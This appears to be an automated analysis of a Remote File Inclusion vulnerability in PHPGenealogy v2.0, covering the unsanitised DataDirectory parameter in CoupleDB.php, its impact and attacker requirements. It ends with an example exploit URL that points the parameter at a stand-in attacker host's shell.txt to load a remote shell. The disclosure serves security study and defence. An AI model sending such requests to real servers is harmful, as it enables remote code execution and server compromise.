Based on the provided content, here's an analysis of the vulnerability:

*   **Root Cause of Vulnerability**: The vulnerability is a Remote File Inclusion (RFI) in PHPGenealogy v2.0. This is due to the `DataDirectory` parameter being vulnerable to including remote files.
*   **Weaknesses/Vulnerabilities Present**: The primary weakness is the lack of proper input sanitization and validation of the `DataDirectory` parameter in the `CoupleDB.php` file. This allows an attacker to specify a remote URL, which will be included and executed by the vulnerable application.
*   **Impact of Exploitation**: Successful exploitation allows an attacker to execute arbitrary PHP code on the server. This can lead to complete compromise of the server, including data theft, data manipulation, denial of service, and other malicious activities.
*  **Attack Vectors**: The attack vector is through a crafted HTTP request to `CoupleDB.php`, manipulating the `DataDirectory` parameter to point to a malicious remote file.
*   **Required Attacker Capabilities/Position**: The attacker needs to be able to send HTTP requests to the vulnerable application. They also need a web server to host their malicious PHP code.

**Additional Details**:
The provided content includes a specific example of the vulnerable URL: `http://[site]/[path]/CoupleDB.php?Parametre=0&DataDirectory=http://evil/shell.txt?`. This demonstrates how the `DataDirectory` parameter can be manipulated to include a remote file (`shell.txt`) from the attacker's server (`evil`).
